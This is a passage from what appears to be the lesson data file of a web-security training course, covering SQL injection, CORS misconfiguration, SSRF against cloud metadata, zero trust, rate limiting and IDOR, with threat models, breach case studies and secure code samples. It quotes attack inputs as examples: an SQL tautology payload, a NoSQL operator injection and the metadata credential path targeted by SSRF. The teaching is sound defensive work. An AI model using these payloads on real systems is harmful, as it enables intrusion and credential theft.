      'SQL injection occurs when user input breaks out of string literal boundaries and rewrites the database Abstract Syntax Tree (AST). Parameterized queries separate query compilation from data binding.',
    keyConcepts: [
      'SQL Abstract Syntax Tree (AST)',
      'Tautology injection (`OR 1=1`)',
      'Query compilation vs. parameter binding',
      'Prepared statements and ORM safety',
    ],
    threatModel: {
      actor: 'Unauthenticated user submitting input into search boxes or login forms.',
      goal: 'Bypass authentication, exfiltrate private database tables, or drop database schemas.',
      vulnerability: 'Dynamically concatenating raw user strings into SQL queries.',
      defense:
        'Prepared statements (parameterized queries) where input is strictly treated as data literals.',
    },
    steps: [
      {
        title: 'Step 1: Naive Query Concatenation',
        description: 'A backend developer writes a dynamic query using raw string interpolation.',
        detail:
          'Backend code: `query = "SELECT * FROM users WHERE username = \'" + user + "\' AND password = \'" + pass + "\'"`. The developer expects user inputs like `alice` and `secret123`.',
        actionSummary: 'query = "SELECT * FROM users WHERE username = \'" + input + "\'"',
        securityTakeaway:
          'Whenever code concatenates untrusted input into an interpreted language string, an injection vulnerability is almost guaranteed.',
      },
      {
        title: 'Step 2: The Attack Payload',
        description:
          'An attacker inputs a quote to break out of the string boundary, followed by a tautology.',
        detail:
          "The attacker types username: `admin' OR '1'='1' -- `. The single quote closes the string literal early, `OR '1'='1'` adds an always-true condition, and `-- ` comments out the rest of the query (including the password check).",
        actionSummary: "Input: admin' OR '1'='1' --",
        securityTakeaway:
          'The attacker is no longer supplying a username value; they are injecting new grammatical clauses into the SQL language parser.',
      },
      {
        title: 'Step 3: SQL AST Grammar Mutation',
        description:
          'The database parser constructs an Abstract Syntax Tree with a hijacked boolean condition.',
        detail:
          "The SQL engine parses: `WHERE (username = 'admin') OR ('1' = '1')`. Since `'1' = '1'` is unconditionally TRUE for every row in the table, the database returns the first record (usually the Administrator account), allowing an unauthenticated login!",
        actionSummary: 'AST parsed: condition evaluates to TRUE for all table rows',
        securityTakeaway:
          'The database cannot distinguish developer intent from attacker intent when evaluating a pre-concatenated SQL string.',
      },
      {
        title: 'Step 4: The Solution — Prepared Statements (Parameterized Queries)',
        description:
          'The database pre-compiles the query template with placeholders before data is bound.',
        detail:
          'The code is rewritten: `SELECT * FROM users WHERE username = $1 AND password = $2`. The database parses and compiles the AST *first*, cementing the tree structure so that `$1` and `$2` can ONLY ever exist as leaf data nodes.',
        actionSummary: 'DB compiles query skeleton with $1 placeholder before reading data',
        securityTakeaway:
          'Prepared statements create a physical architectural barrier between code syntax and data values.',
      },
      {
        title: 'Step 5: Safe Execution with Input Bound as Literal',
        description:
          'When the malicious input is passed, the database evaluates it strictly as a literal string.',
        detail:
          "The database looks for a user whose literal username equals the exact string `\"admin' OR '1'='1' -- \"`. No such user exists, the query returns 0 rows, and authentication fails safely. The SQL grammar remains completely unchanged.",
        actionSummary: 'Database searches for literal string matching the input',
        securityTakeaway:
          'Parameterized queries do NOT rely on string escaping or blacklists; they mathematically prevent injection at the parser level.',
      },
    ],
    cveCaseStudy: {
      title: 'Sony Pictures Global SQL Injection Hack',
      cveId: 'LulzSec Breach Record',
      year: '2011',
      organization: 'Sony Pictures Entertainment',
      damage: 'Over 1,000,000 user passwords, email addresses, and home addresses leaked',
      breakdown:
        "A simple, classic SQL injection in Sony's website allowed an external hacker group to extract full database dumps. Sony had stored all user data and passwords in plaintext in backend tables accessed by raw string-concatenated SQL queries.",
      rootCause: 'Dynamic SQL string concatenation without prepared statements.',
      takeaway:
        'Never construct SQL via string templates. Use ORMs or parameterized query drivers.',
    },
    hardeningGuide: {
      title: 'Database Access Hardening Blueprint',
      checklist: [
        'Always use parameterized queries or trusted ORMs (Prisma, SQLAlchemy, Hibernate).',
        'Run database applications with least-privilege DB user accounts (no DROP/ALTER permissions).',
        'Disable verbose database error reporting to clients to prevent error-based SQLi discovery.',
        'Use query timeouts to prevent blind SQLi heavy sleep() attacks.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'db-query.ts',
        code: `// SECURE: Parameterized query in Node pg / Postgres
const query = 'SELECT id, email, role FROM users WHERE username = $1 AND password_hash = $2';
const values = [req.body.username, hashedPassword];

const { rows } = await pool.query(query, values);
if (rows.length === 0) {
  throw new Error('Invalid credentials');
}`,
        note: 'Postgres handles compilation and data binding as separate network protocol phases.',
      },
    },
    faqs: [
      {
        question: 'Are modern ORMs completely immune to SQL injection?',
        answer:
          'Most standard ORM methods (like User.findUnique({ where: { id } })) are immune because they parameterize inputs. However, vulnerabilities arise if developers use raw ORM escape hatches (like prisma.$queryRawUnsafe or sequelize.literal) with concatenated input.',
      },
      {
        question: 'Can SQL injection occur in NoSQL databases like MongoDB?',
        answer:
          'Yes! NoSQL injection occurs when attackers inject JSON operator objects (e.g. {"username": "admin", "password": {"$gt": ""}}) into unvalidated database queries.',
      },
    ],
  },
  {
    id: 'cors-preflight',
    title: 'CORS & Preflight (OPTIONS) Handshake',
    subtitle:
      'Cross-Origin Resource Sharing: browser-enforced resource sharing, preflights, and wildcard hazards',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '10 min',
    level: 'Intermediate',
    summary:
      'The browser Same-Origin Policy (SOP) prohibits scripts from reading cross-origin responses. CORS defines the protocol by which servers explicitly grant exceptions via HTTP response headers and preflight OPTIONS checks.',
    keyConcepts: [
      'Same-Origin Policy (Protocol, Host, Port)',
      'Simple vs Preflighted Requests (OPTIONS)',
      'Access-Control-Allow-Origin: * vs Specific',
      'Credentialed Requests with Cookies (withCredentials)',
    ],
    threatModel: {
      actor: "Malicious web application on `evil.com` running in the victim's browser.",
      goal: 'Send cross-origin fetch requests to `api.bank.com` to exfiltrate private financial records or perform actions.',
      vulnerability:
        'Permissive CORS configuration, such as reflecting incoming `Origin` headers with `Allow-Credentials: true`.',
      defense:
        'Strict server-side Origin allowlisting, never returning wildcard `*` with credentials, and validating preflights.',
    },
    steps: [
      {
        title: 'Step 1: The Same-Origin Policy (SOP) Baseline',
        description: 'Browsers isolate different websites by origin (scheme + host + port).',
        detail:
          'By default, JavaScript running on `https://dashboard.financeapp.com` cannot read the response of an HTTP request sent to `https://api.cloudledger.io`. This prevents malicious websites from reading your private emails or bank data.',
        actionSummary: 'Browser isolates dashboard.financeapp.com from api.cloudledger.io',
        securityTakeaway:
          'The Same-Origin Policy is the cornerstone of modern web browser security.',
      },
      {
        title: 'Step 2: Simple Requests vs. Preflights',
        description:
          'Standard GET/POST with text/plain are "Simple"; PUT/DELETE or custom headers require a preflight.',
        detail:
          'If a request uses non-standard methods (PUT, DELETE) or custom headers (like `Authorization` or `Content-Type: application/json`), the browser automatically dispatches a preflight HTTP `OPTIONS` request first before sending the actual payload.',
        actionSummary: 'Browser sends OPTIONS /v1/records to inspect server CORS policy',
        securityTakeaway:
          'Preflight requests protect legacy servers from unexpected state mutations.',
      },
      {
        title: 'Step 3: Server Evaluates Preflight and Responds',
        description: 'The API server replies with permitted origins, methods, and allowed headers.',
        detail:
          'The server returns `Access-Control-Allow-Origin: https://dashboard.financeapp.com`, `Access-Control-Allow-Methods: GET, POST, PUT`, and `Access-Control-Allow-Headers: Authorization, Content-Type`.',
        actionSummary: 'Server returns Access-Control-* headers',
        securityTakeaway:
          'The server dictates the exact contract. If the client’s request exceeds this contract, the browser halts.',
      },
      {
        title: 'Step 4: Browser Evaluates Allowed Policy',
        description:
          'The client browser inspects the returned headers to decide if the actual request may proceed.',
        detail:
          'If the preflight succeeds, the browser dispatches the actual PUT request. When the server response returns, the browser permits JavaScript code to access `response.json()`.',
        actionSummary: 'Browser verifies origin match and delivers response data to JS',
        securityTakeaway:
          'Notice: CORS is enforced by the BROWSER! A tool like curl or Python does not enforce CORS.',
      },
      {
        title: 'Step 5: Fatal Misconfiguration — Insecure Origin Reflection',
        description:
          'Naive servers dynamically echo back the client Origin with credentials enabled.',
        detail:
          'Many developers blindly configure: `res.setHeader("Access-Control-Allow-Origin", req.headers.origin); res.setHeader("Access-Control-Allow-Credentials", "true");`. When an attacker site `evil.com` sends a request, the server reflects `evil.com`. The browser attaches the victim’s cookies, and `evil.com` reads all private API data!',
        actionSummary: 'Attacker site evil.com receives reflected CORS permissions and steals data',
        securityTakeaway:
          'Never reflect the request Origin without validating it against a strict server-side whitelist.',
      },
    ],
    cveCaseStudy: {
      title: 'Bitcoin Exchange API CORS Data Exfiltration',
      cveId: 'CORS Origin Reflection Flaw',
      year: '2018',
      organization: 'Multiple Cryptocurrency Trading Platforms',
      damage:
        'Private user wallet balances and trading histories exposed to third-party phishing sites',
      breakdown:
        "A trading API had an automated CORS middleware that copied the incoming `Origin` request header into `Access-Control-Allow-Origin` and enabled `Access-Control-Allow-Credentials: true`. A malicious website visited by an authenticated trader could silently fetch `/api/user/balance` and read the user's private wallet information.",
      rootCause: 'Dynamic reflection of untrusted request Origin header with credentials enabled.',
      takeaway:
        'Never use regular expressions or naive substring matches (e.g. matching `mybank.com.attacker.com`) for CORS origin validation.',
    },
    hardeningGuide: {
      title: 'Production CORS Configuration in Express / Node',
      checklist: [
        'Maintain an explicit array whitelist of authorized origin domains.',
        'Never use Access-Control-Allow-Origin: * when credentials are enabled.',
        'Validate origin with exact string matching, not loose regex.',
        'Set Access-Control-Max-Age (e.g. 86400) to cache preflight responses and reduce latency.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'cors-config.ts',
        code: `import cors from 'cors';

const ALLOWED_ORIGINS = [
  'https://app.company.com',
  'https://admin.company.com'
];

export const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    // Allow non-browser requests (e.g. mobile apps or curl with no origin)
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS policy: Origin not allowed'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400 // Cache preflight for 24 hours
};`,
        note: 'Use exact origin comparison against a strict hardcoded or environment whitelist.',
      },
    },
    faqs: [
      {
        question: 'Does CORS protect my backend API from malicious curl requests or scrapers?',
        answer:
          'No! CORS is strictly a browser-enforced security mechanism. A Python script, curl, or Postman does not enforce CORS and can send any request directly to your API. Protect APIs with authentication tokens and rate limiting.',
      },
      {
        question: 'Why does Access-Control-Allow-Origin: * not work with credentials: "include"?',
        answer:
          'The W3C/WHATWG CORS specification intentionally prohibits combining wildcard "*" with credentials ("true") as a critical security safeguard to prevent any random website on the internet from reading credentialed user data.',
      },
    ],
  },
  {
    id: 'ssrf-cloud-metadata',
    title: 'SSRF & Cloud Metadata Defense (IMDSv2)',
    subtitle:
      'Server-Side Request Forgery: protecting internal VPCs, localhost, and AWS/GCP 169.254.169.254 metadata services',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '12 min',
    level: 'Advanced',
    summary:
      'When a web application fetches a user-supplied URL (for avatars, webhooks, or PDF generation), an attacker can supply an internal IP address (`169.254.169.254` or `10.0.0.0/8`). Learn how IMDSv2 and socket-level IP filtering stop SSRF.',
    keyConcepts: [
      'Server-Side Request Forgery mechanics',
      'Cloud Instance Metadata Service (IMDSv1 vs IMDSv2)',
      'RFC 1918 Private IP subnets & link-local addresses',
      'DNS Rebinding and Socket-Level IP verification',
    ],
    threatModel: {
      actor: 'External attacker interacting with a webhook, URL preview, or file import feature.',
      goal: 'Force the server to query internal cloud infrastructure, stealing temporary IAM cloud credentials or dumping internal databases.',
      vulnerability:
        'Unrestricted backend HTTP client fetching URLs without validating destination IP addresses.',
      defense:
        'Enforcing IMDSv2 (requiring PUT session token), validating resolved IPs against private CIDR blocklists, and pinning connections.',
    },
    steps: [
      {
        title: 'Step 1: The Vulnerable URL Fetching Feature',
        description:
          'An application offers a feature that downloads remote assets based on user input.',
        detail:
          'Examples include: "Import Avatar from URL", "Render Webpage to PDF", or "Register Webhook". The backend code executes: `fetch(req.body.avatarUrl)`. The developer expects public URLs like `https://photos.com/pic.jpg`.',
        actionSummary: 'User submits arbitrary destination URL to server endpoint',
        securityTakeaway:
          'Whenever a server makes outbound HTTP requests based on user input, it becomes an unintended proxy for the attacker.',
      },
      {
        title: 'Step 2: Attacker Injects Cloud Metadata IP',
        description: 'The attacker provides the link-local address `http://169.254.169.254`.',
        detail:
          'In AWS, GCP, and Azure, `169.254.169.254` is the Instance Metadata Service (IMDS) accessible by any virtual machine without authentication in IMDSv1. The attacker targets `/latest/meta-data/iam/security-credentials/RoleName`.',
        actionSummary: 'Attacker submits: http://169.254.169.254/.../credentials',
        securityTakeaway:
          'The server sits inside the VPC perimeter, granting it access to internal services invisible to the outside world.',
      },
      {
        title: 'Step 3: The Server Fetches the Internal Target',
        description:
          'The server makes a socket connection to the internal metadata service and reads the response.',
        detail:
          'Because the server has network routing to the link-local address, the cloud hypervisor returns temporary IAM STS credentials (AccessKeyId, SecretAccessKey, SessionToken). The server returns the payload to the attacker!',
        actionSummary: 'Server dumps cloud IAM credentials in response body',
        securityTakeaway:
          'The attacker now possesses active cloud credentials and can query S3, RDS, or DynamoDB directly via AWS CLI.',
      },
      {
        title: 'Step 4: Defense 1 — Private IP CIDR Denylist',
        description:
          'The server resolves the hostname and rejects any private or link-local IP addresses.',
        detail:
          'Before connecting, the application resolves DNS and checks the IP against denylists: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, and `169.254.0.0/16`. If private, the connection is instantly aborted.',
        actionSummary: 'Socket firewall intercepts connection to private IP before dispatch',
        securityTakeaway:
          'Always validate the RESOLVED IP address, not just the raw hostname string, to prevent DNS rebinding.',
      },
      {
        title: 'Step 5: Defense 2 — Enforce Cloud IMDSv2',
        description: 'Cloud providers mandate a two-step session-oriented metadata token.',
        detail:
          'Under AWS IMDSv2, metadata requests REQUIRE an `X-aws-ec2-metadata-token` header obtained via an explicit HTTP `PUT` request with TTL header. Because typical SSRF attacks can only trigger simple GET/POST requests, attackers cannot obtain this token, completely neutralizing metadata SSRF.',
        actionSummary:
          'Metadata service returns HTTP 401 Unauthorized for requests lacking session token',
        securityTakeaway:
          'Enforcing IMDSv2 at the cloud infrastructure level provides defense-in-depth even if application code contains an SSRF bug.',
      },
    ],
    cveCaseStudy: {
      title: 'The Capital One $80 Million Cloud Metadata SSRF Breach',
      cveId: 'DOJ Indictment 2019',
      year: '2019',
      organization: 'Capital One Financial Corp',
      damage: '$80M regulatory fine; 106 million customer credit card applications exfiltrated',
      breakdown:
        'A misconfigured open-source Web Application Firewall (ModSecurity) running on an AWS EC2 instance was tricked into making an SSRF request to `169.254.169.254`. The attacker dumped the IAM role credentials of the WAF instance, which had overly broad permissions to sync 700+ Amazon S3 buckets containing encrypted and plaintext customer records.',
      rootCause:
        'SSRF vulnerability combined with legacy IMDSv1 and excessive IAM role permissions.',
      takeaway:
        'Enforce IMDSv2, disable metadata access on EC2 instances where unneeded, and strictly scope IAM role permissions.',
    },
    hardeningGuide: {
      title: 'SSRF Prevention & IMDSv2 AWS Enforcement',
      checklist: [
        'Enforce IMDSv2 on all EC2 launch templates (HttpTokens=required).',
        'Set IMDS Hop Limit to 1 on containerized workloads to prevent Docker containers from accessing host metadata.',
        'Use safe outbound HTTP clients that validate resolved IPs before connecting.',
        'Isolate URL-fetching workers inside dedicated non-privileged VPC subnets.',
      ],
      codeSample: {
        language: 'bash',
        filename: 'enforce-imdsv2.sh',
        code: `# Enforce IMDSv2 across existing AWS EC2 instances
aws ec2 modify-instance-metadata-options \\
    --instance-id i-0123456789abcdef0 \\
    --http-tokens required \\
    --http-endpoint enabled \\
    --http-put-response-hop-limit 1`,
        note: 'Setting hop limit to 1 prevents containers on ECS/Kubernetes from reaching the host node metadata.',
      },
    },
    faqs: [
      {
        question: 'What is DNS Rebinding in SSRF attacks?',
        answer:
          'An attacker registers a domain whose DNS server returns a public IP on the first lookup (passing the initial application check), but returns 127.0.0.1 or 169.254.169.254 a few milliseconds later when the HTTP client actually connects. Fix this by pinning the resolved IP for the socket connection.',
      },
      {
        question: 'Does GCP have a metadata service like AWS?',
        answer:
          'Yes! GCP uses http://metadata.google.internal (169.254.169.254). However, GCP has historically required the custom header "Metadata-Flavor: Google" on all requests, which provided early protection against simple SSRF.',
      },
    ],
  },

  // ==========================================
  // TRACK 3: CLOUD, API DEFENSE & ZERO TRUST
  // ==========================================
  {
    id: 'zero-trust',
    title: 'Zero Trust & Service-to-Service mTLS',
    subtitle:
      'Never trust, always verify: moving from castle-and-moat network security to cryptographic microsegmentation',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '14 min',
    level: 'Advanced',
    summary:
      'Perimeter firewalls assume internal traffic is safe. Zero Trust treats every internal microservice request as hostile, requiring mutual TLS (mTLS) identities and short-lived scoped cryptographic assertions.',
    keyConcepts: [
      'Castle-and-Moat vs Zero Trust Architecture',
      'Mutual TLS (mTLS) with SPIFFE/SPIRE IDs',
      'Service mesh sidecar proxy enforcement',
      'Least-privilege token delegation',
    ],
    threatModel: {
      actor:
        'Lateral-moving attacker who has already breached one internal microservice or worker node.',
      goal: 'Pivot laterally across internal private subnets to exfiltrate database records or control plane secrets.',
      vulnerability:
        'Unencrypted and unauthenticated internal network traffic behind a perimeter firewall.',
      defense:
        'Every microservice authenticates the calling service using mTLS x509 certificates and validates fine-grained authorization policies.',
    },
    steps: [
      {
        title: 'Step 1: The Flaw of Castle-and-Moat Security',
        description:
          'Traditional architectures trust all traffic once it passes the external reverse proxy.',
        detail:
          'Traffic from the public internet is inspected at the ingress gateway. But once inside the VPC, Service A talks to Service B over unauthenticated plain HTTP. If an attacker breaches Service A, they can freely impersonate any service and query the database.',
        actionSummary: 'Perimeter firewall allows unrestricted internal lateral movement',
        securityTakeaway:
          'Assume breach! In modern cloud environments, internal networks cannot be treated as trusted zones.',
      },
      {
        title: 'Step 2: Zero Trust Principle — Explicit Verification',
        description:
          'Every single hop across microservices must cryptographically prove its identity.',
        detail:
          'Under Zero Trust, each microservice instance is issued a short-lived cryptographic X.509 identity certificate (e.g. `spiffe://cluster.local/ns/prod/sa/orders-service`) signed by an internal Certificate Authority.',
        actionSummary: 'Service instances receive SPIFFE identity certificates',
        securityTakeaway:
          'Identity is tied to cryptographic keys, not ephemeral IP addresses or network subnets.',
      },
      {
        title: 'Step 3: Mutual TLS (mTLS) Handshake Between Services',
        description:
          'Both the client service AND the server service present and verify certificates.',
        detail:
          'When the Orders service calls the Payments service, the two sidecar proxies (e.g. Envoy) perform a two-way TLS handshake. The client verifies the server’s identity, and the server verifies the client’s identity. Traffic is encrypted in transit.',
        actionSummary: 'Orders and Payments sidecars verify each other’s certificates',
        securityTakeaway:
          'mTLS guarantees both authentication and wire encryption for every microservice interaction.',
      },
      {
        title: 'Step 4: Fine-Grained Authorization Policy Enforcement',
        description:
          'Even with verified identity, requests are checked against strict least-privilege policies.',
        detail:
          'The Payments service policy engine checks: `ALLOW spiffe://.../sa/orders-service to POST /charges`. If a compromised `analytics-service` attempts to call `POST /charges`, the proxy immediately denies the request with `403 Forbidden`.',
        actionSummary: 'Policy engine validates: caller identity authorized for specific endpoint',
        securityTakeaway:
          'Zero Trust pairs cryptographic identity (who are you?) with continuous policy evaluation (are you allowed to do this specific action right now?).',
      },
    ],
    cveCaseStudy: {
      title: 'SolarWinds & Lateral Movement Supply Chain Breach',
      cveId: 'CISA Emergency Directive 21-01',
      year: '2020',
      organization: 'SolarWinds, US Government Agencies, Tech Giants',
      damage: 'Compromise of dozens of Fortune 500 networks and federal departments',
      breakdown:
        'Attackers compromised the software build pipeline (Orion) to gain an initial foothold. Once inside the perimeter, they exploited weak internal network segmentation and unauthenticated internal protocols to move laterally across Active Directory domains and access cloud email systems.',
      rootCause: 'Overreliance on perimeter defenses and implicit trust within internal subnets.',
      takeaway:
        'Zero Trust microsegmentation prevents an initial endpoint breach from escalating into a total enterprise compromise.',
    },
    hardeningGuide: {
      title: 'Istio / Envoy Service Mesh Zero Trust Policy',
      checklist: [
        'Enforce STRICT mTLS across all Kubernetes namespaces.',
        'Define explicit AuthorizationPolicy resources default-denying all service communication.',
        'Rotate SPIFFE X.509 certificates automatically every 12 to 24 hours.',
        'Log all inter-service authorization rejections to security SIEM for breach detection.',
      ],
      codeSample: {
        language: 'yaml',
        filename: 'zero-trust-policy.yaml',
        code: `apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payments-least-privilege
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payments-service
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/prod/sa/orders-service-sa"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/api/v1/charges"]`,
        note: 'Only the orders-service service account is permitted to invoke the payments API.',
      },
    },
    faqs: [
      {
        question: 'What is the performance overhead of service-to-service mTLS?',
        answer:
          'Modern CPUs include AES-NI hardware instructions. In high-performance service meshes like Envoy/Linkerd with connection reuse (HTTP/2 keep-alive), the TLS overhead is typically under 1-2 milliseconds of latency.',
      },
      {
        question: 'What is SPIFFE/SPIRE?',
        answer:
          'SPIFFE (Secure Production Identity Framework for Everyone) is a standard for machine identity. SPIRE is the open-source software that automatically issues and rotates short-lived cryptographic certificates to containers.',
      },
    ],
  },
  {
    id: 'rate-limiting-ddos',
    title: 'Rate Limiting & DDoS Defense (Token Bucket)',
    subtitle:
      'Layer 7 traffic management: mitigating brute force, credential stuffing, and resource exhaustion',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '10 min',
    level: 'Intermediate',
    summary:
      'Without traffic regulation, a single script can overwhelm backend database connection pools or brute-force user passwords. Learn how Token Bucket rate limiting and HTTP 429 status codes defend APIs.',
    keyConcepts: [
      'Layer 7 Application Denial of Service',
      'Token Bucket vs Sliding Window algorithms',
      'HTTP 429 Too Many Requests & Retry-After',
      'Distributed rate limiting with Redis & Lua',
    ],
    threatModel: {
      actor: 'Botnet or malicious scraper executing automated high-concurrency requests.',
      goal: 'Brute-force login credentials, scrape proprietary database records, or crash backend database servers.',
      vulnerability: 'Unthrottled public API endpoints accepting unbounded traffic volumes.',
      defense: 'Distributed token-bucket rate limiting at the API gateway or reverse proxy layer.',
    },
    steps: [
      {
        title: 'Step 1: Normal Inbound Traffic vs. Burst Influx',
        description: 'Clients send requests to protected API endpoints.',
        detail:
          'Under regular operation, users trigger occasional requests (e.g. 1 request per few seconds). But during an automated attack, bots fire hundreds of concurrent requests per second.',
        actionSummary: 'Traffic arrives at API Gateway / Reverse Proxy',
        securityTakeaway:
          'Rate limiting must intervene at the edge before requests hit expensive database queries.',
      },
      {
        title: 'Step 2: Token Bucket Algorithm Mechanics',
        description:
          'The rate limiter maintains a virtual bucket of tokens per client IP or API key.',
        detail:
          'The bucket holds a maximum capacity $B$ (e.g. 10 tokens) and refills at a steady rate $r$ (e.g. 1 token per second). When a request arrives, the algorithm checks if at least 1 token is available. If yes, it decrements 1 token and lets the request pass (HTTP 200).',
        actionSummary: 'Tokens >= 1 -> Token consumed -> Request allowed',
        securityTakeaway:
          'The Token Bucket algorithm gracefully accommodates natural user bursts while capping sustained throughput.',
      },
      {
        title: 'Step 3: Bucket Exhaustion — Load Shedding',
        description:
          'When the burst exceeds capacity, the bucket empties and subsequent requests are shed.',
        detail:
          'When the token count reaches 0, the gateway drops incoming requests immediately. It responds with `HTTP 429 Too Many Requests` and headers `X-RateLimit-Remaining: 0` and `Retry-After: 3`.',
        actionSummary: 'Tokens == 0 -> Request dropped with HTTP 429',
        securityTakeaway:
          'Dropping requests at the gateway consumes negligible CPU and preserves core database health.',
      },
      {
        title: 'Step 4: Distributed State Synchronization (Redis)',
        description:
          'In multi-instance cloud deployments, rate limiter state is synchronized via Redis.',
        detail:
          'Using an atomic Redis Lua script, distributed API gateway nodes evaluate and decrement the client’s token bucket in a single atomic network round-trip, preventing race condition bypasses.',
        actionSummary: 'Gateway executes atomic Redis Lua evaluation',
        securityTakeaway:
          'Always use atomic operations in distributed environments to avoid race conditions.',
      },
    ],
    cveCaseStudy: {
      title: 'Credential Stuffing Attacks on Major Streaming Platforms',
      cveId: 'FBI Private Industry Notification 2020',
      year: '2020',
      organization: 'Multiple Global Streaming & E-Commerce Services',
      damage: 'Hundreds of thousands of accounts hijacked; severe server degradation',
      breakdown:
        'Attackers used automated tools (Sentry MBA) with leaked credential combo lists to execute millions of automated login attempts per hour against mobile API endpoints that lacked rate limiting.',
      rootCause: 'Login endpoints had no IP-based or account-based rate limiting.',
      takeaway:
        'Apply strict rate limiting (e.g. max 5 failed attempts per IP / per username per minute) on all authentication endpoints.',
    },
    hardeningGuide: {
      title: 'Distributed Redis Rate Limiter Implementation',
      checklist: [
        'Enforce per-IP and per-User/Token tiered rate limits.',
        'Use atomic Lua scripts to prevent race conditions during concurrent bursts.',
        'Always return standard Retry-After headers with remaining seconds.',
        'Exempt health check endpoints (/healthz) from rate limits to prevent cascading gateway failure.',
      ],
      codeSample: {
        language: 'lua',
        filename: 'rate_limiter.lua',
        code: `-- Atomic Redis Token Bucket evaluation script
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local current = tonumber(redis.call('get', key) or "0")

if current + 1 > limit then
  return 0 -- Throttled
else
  redis.call("INCRBY", key, 1)
  if current == 0 then
    redis.call("EXPIRE", key, 60) -- 1 minute window
  end
  return 1 -- Allowed
end`,
        note: 'Executing inside Redis ensures atomic evaluation across hundreds of worker nodes.',
      },
    },
    faqs: [
      {
        question: 'What is the difference between Token Bucket and Leaky Bucket?',
        answer:
          'Token Bucket allows sudden bursts of traffic up to the bucket capacity B while enforcing an average rate r. Leaky Bucket smooths out all bursts, releasing requests at a strictly constant rate.',
      },
      {
        question:
          'How do you handle NAT gateways where thousands of university or corporate users share one public IP?',
        answer:
          'Combine IP rate limiting with session cookies or authenticated user IDs, and apply progressive challenges (like CAPTCHA or proof-of-work) rather than hard IP bans for shared IPs.',
      },
    ],
  },
  {
    id: 'idor-bola',
    title: 'Broken Object Level Authorization (IDOR / BOLA)',
    subtitle:
      'OWASP API Security #1: why authentication is not authorization and how scoped queries stop data leaks',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '11 min',
    level: 'Intermediate',
    summary:
      'The #1 vulnerability in modern web and mobile APIs. A user logs in legitimately, then alters an ID parameter in the URL (`/api/documents/9002`) to view or mutate another tenant’s private records.',
    keyConcepts: [
      'Insecure Direct Object References (IDOR)',
      'Broken Object Level Authorization (BOLA)',
      'Authentication vs Authorization separation',
      'Tenant Scoping & Attribute-Based Access Control',
    ],
    threatModel: {
      actor: 'Authenticated user or tenant in a multi-tenant SaaS application.',
      goal: 'Access, download, or modify records belonging to other users or competing organizations.',
      vulnerability:
        'The API checks that the user is logged in, but fails to check whether the user has ownership rights to the requested object ID.',
      defense:
        'Scoped database queries (`WHERE id = :id AND owner_id = :userId`) and centralized policy engines.',
    },
    steps: [
      {
        title: 'Step 1: The Legitimate Authenticated Session',
        description: 'User Alice logs into the web application and requests her invoice.',
        detail:
          'Alice authenticates with valid credentials. Her browser sends `GET /api/documents/9001` with her Bearer token. The server sees Alice is logged in and returns document #9001.',
        actionSummary: 'Alice queries her own document #9001 -> 200 OK',
        securityTakeaway: 'The authentication layer did its job: it verified who Alice is.',
      },
      {
        title: 'Step 2: The Tampered Direct Object Identifier',
        description:
          'Alice modifies the URL identifier to point to document #9002 (belonging to Bob).',
        detail:
          'In the browser network tab or API client, the user changes the resource ID: `GET /api/documents/9002`. Alice is still logged in with her valid session token.',
        actionSummary: 'Alice submits GET /api/documents/9002',
        securityTakeaway:
          'Attackers systematically iterate through sequential IDs (1001, 1002, 1003) to harvest records.',
      },
      {
        title: 'Step 3: The Flawed Backend Query',
        description:
          'The vulnerable server executes a direct database lookup without checking ownership.',
        detail:
          'The backend controller runs: `SELECT * FROM documents WHERE id = 9002`. Because document #9002 exists, the database returns it, and the server sends Bob’s confidential record back to Alice!',
        actionSummary: 'Server returns Bob’s record to Alice with HTTP 200 OK',
        securityTakeaway:
          'Authentication answered "Who are you?". But the server failed to answer "Do you own this specific object?".',
      },
      {
        title: 'Step 4: The Hardened Scoped Query',
        description: 'The backend scopes all lookups by the authenticated user or tenant identity.',
        detail:
          'The query is rewritten: `SELECT * FROM documents WHERE id = :id AND owner_id = :currentUserId`. The database checks both conditions. Since Alice’s ID (101) does not match document #9002’s owner (102), 0 rows are returned.',
        actionSummary: 'Database returns 0 rows -> API returns 403 Forbidden',
        securityTakeaway:
          'Scoped queries make IDOR mathematically impossible at the database retrieval layer.',
      },
    ],
    cveCaseStudy: {
      title: 'First American Financial 885 Million Record IDOR Leak',
      cveId: 'KrebsOnSecurity 2019',
      year: '2019',
      organization: 'First American Financial Corp',
      damage: '885 Million mortgage documents, bank account numbers, and wire receipts exposed',
      breakdown:
        'Anyone with a valid document link could change a sequential digit in the URL (e.g. from `.../doc/00001001` to `.../doc/00001002`) and view private closing documents of other customers without any authentication or authorization checks.',
      rootCause: 'Predictable sequential IDs with zero object-level authorization checks.',
      takeaway:
        'Never expose sequential internal primary keys; use UUIDv4 and always enforce ownership checks.',
    },
    hardeningGuide: {
      title: 'Object-Level Authorization Hardening Blueprint',
      checklist: [
        'Always enforce tenant scoping in database queries (AND organization_id = :orgId).',
        'Use UUIDv4 or random nanoids instead of sequential auto-incrementing integers.',
        'Adopt an authorization policy layer (CASL, Oso, Open Policy Agent).',
        "Write automated integration tests asserting that User B cannot access User A's resources.",
      ],
      codeSample: {
        language: 'typescript',
        filename: 'document-service.ts',
        code: `// SECURE: Strict object ownership assertion
export async function getDocumentById(docId: string, currentUser: AuthUser) {
  const document = await db.documents.findFirst({
    where: {
      id: docId,
      organizationId: currentUser.orgId, // Multi-tenant isolation
      ownerId: currentUser.id            // Object-level authorization
    }
  });

  if (!document) {
